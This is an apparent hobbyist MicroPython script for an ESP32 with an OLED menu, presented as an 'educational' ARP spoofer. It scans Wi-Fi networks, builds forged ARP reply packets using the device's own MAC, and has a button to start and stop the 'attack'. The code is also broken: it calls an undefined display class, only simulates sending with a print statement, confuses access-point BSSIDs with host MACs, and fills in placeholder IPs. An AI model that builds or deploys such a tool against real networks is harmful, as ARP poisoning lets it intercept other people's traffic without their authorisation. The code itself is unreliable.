//ARP Spoof by MrEchoFi- Md. Abu Naser Nayeem[Tanjib]-IOT project for penetration testing
//This project's for educational porposes. 

from machine import Pin, I2C
from time import sleep, ticks_ms
import network
import ustruct
from u8g2 import U8G2_SSD1306_128X64_NONAME_F_HW_I2C

# Pin definitions
LED_PIN = 2
BUTTON_NEXT_PIN = 17
BUTTON_PREV_PIN = 5
BUTTON_SELECT_PIN = 18

# Constants
AUTH_PASSWORD = "ARP"
OLED_ADDRESS = 0x3C  # I2C address for the OLED
packetRate = 500
menuIndex = 0
toggle_status = False
packetCount = 0
prevTime = 0

# Wi-Fi networks
ssidList = []
macList = []
ipList = []
networkCount = 0
selectedNetwork = -1

# Target MAC and IP
targetMAC = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]
targetIP = [192, 168, 1, 100]

# Initialize OLED display
i2c = I2C(0, scl=Pin(22), sda=Pin(21))
oled = SSD1306_I2C(128, 64, i2c)

# Initialize LED and buttons
led = Pin(LED_PIN, Pin.OUT)
button_next = Pin(BUTTON_NEXT_PIN, Pin.IN, Pin.PULL_UP)
button_prev = Pin(BUTTON_PREV_PIN, Pin.IN, Pin.PULL_UP)
button_select = Pin(BUTTON_SELECT_PIN, Pin.IN, Pin.PULL_UP)

# ARP packet template
arp_packet = bytearray([
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  # Destination MAC
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  # Source MAC
    0x08, 0x06,                          # Frame type (ARP)
    0x00, 0x01,                          # Hardware type (Ethernet)
    0x08, 0x00,                          # Protocol type (IPv4)
    0x06, 0x04,                          # Hardware size, protocol size
    0x00, 0x02,                          # Opcode (2 for reply)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  # Sender MAC
    192, 168, 1, 1,                      # Sender IP
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  # Target MAC
    192, 168, 1, 100                     # Target IP
])

# Wi-Fi setup
def setupWiFi():
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    scanWiFiNetworks()

# Scan Wi-Fi networks
def scanWiFiNetworks():
    global networkCount
    wlan = network.WLAN(network.STA_IF)
    networks = wlan.scan()
    networkCount = len(networks)
    for net in networks:
        ssidList.append(net[0].decode())
        macList.append(':'.join(f'{b:02X}' for b in net[1]))
        ipList.append(f"192.168.1.{100 + len(ssidList)}")  # Dummy IP for now

# Update ARP packet
def updateARPDetails():
    global arp_packet
    # Destination MAC
    arp_packet[:6] = bytes(targetMAC)
    # Sender MAC
    sender_mac = network.WLAN(network.STA_IF).config('mac')
    arp_packet[6:12] = sender_mac
    arp_packet[22:28] = sender_mac
    # Sender IP
    local_ip = network.WLAN(network.STA_IF).ifconfig()[0]
    local_ip_bytes = ustruct.pack('>BBBB', *[int(x) for x in local_ip.split('.')])
    arp_packet[28:32] = local_ip_bytes
    # Target MAC and IP
    arp_packet[32:38] = bytes(targetMAC)
    arp_packet[38:42] = bytes(targetIP)

# Send ARP packets
def sendARP():
    global prevTime, packetCount
    if toggle_status and ticks_ms() - prevTime > (1000 // packetRate):
        prevTime = ticks_ms()
        for _ in range(5):
            # Simulate sending ARP (replace with actual implementation if available)
            print("Sending ARP packet...")
            sleep(0.002)
        led.on()
        sleep(0.005)
        led.off()
        packetCount += 5

# Draw OLED menu
def drawOLEDMenu():
    oled.fill(0)
    if selectedNetwork == -1:
        drawNetworkList()
    else:
        if menuIndex == 0:
            oled.text("Mr.EchoFi ARP Spoofer", 0, 0)
            oled.text(f"Status: {'ON' if toggle_status else 'OFF'}", 0, 16)
        elif menuIndex == 1:
            oled.text("Toggle Attack", 0, 0)
            oled.text(f"{'Stop' if toggle_status else 'Start'} Attack", 0, 16)
            oled.text(f"Packets Sent: {packetCount}", 0, 32)
    oled.show()

# Draw network list
def drawNetworkList():
    oled.text("Select Network", 0, 0)
    for i in range(min(3, networkCount)):
        list_index = (menuIndex + i) % networkCount
        display_text = f"{ssidList[list_index]} {macList[list_index]}"
        if i == 0:
            oled.text(f"> {display_text}", 0, 16 + i * 12)
        else:
            oled.text(display_text, 0, 16 + i * 12)

# Handle button presses
def handleButtonPress():
    global menuIndex, selectedNetwork, toggle_status
    if not button_next.value():
        menuIndex = (menuIndex + 1) % ((selectedNetwork == -1) and networkCount or 2)
        sleep(0.2)
    if not button_prev.value():
        menuIndex = (menuIndex - 1) % ((selectedNetwork == -1) and networkCount or 2)
        sleep(0.2)
    if not button_select.value():
        if selectedNetwork == -1:
            selectedNetwork = menuIndex
            targetMAC[:] = [int(x, 16) for x in macList[selectedNetwork].split(':')]
            targetIP[:] = [int(x) for x in ipList[selectedNetwork].split('.')]
            updateARPDetails()
        elif menuIndex == 1:
            toggle_status = not toggle_status
            if not toggle_status:
                packetCount = 0
        sleep(0.2)

# Main setup
def setup():
    setupWiFi()
    updateARPDetails()
    drawOLEDMenu()

# Main loop
def loop():
    handleButtonPress()
    drawOLEDMenu()
    sendARP()

# Run the program
setup()
while True:
    loop()
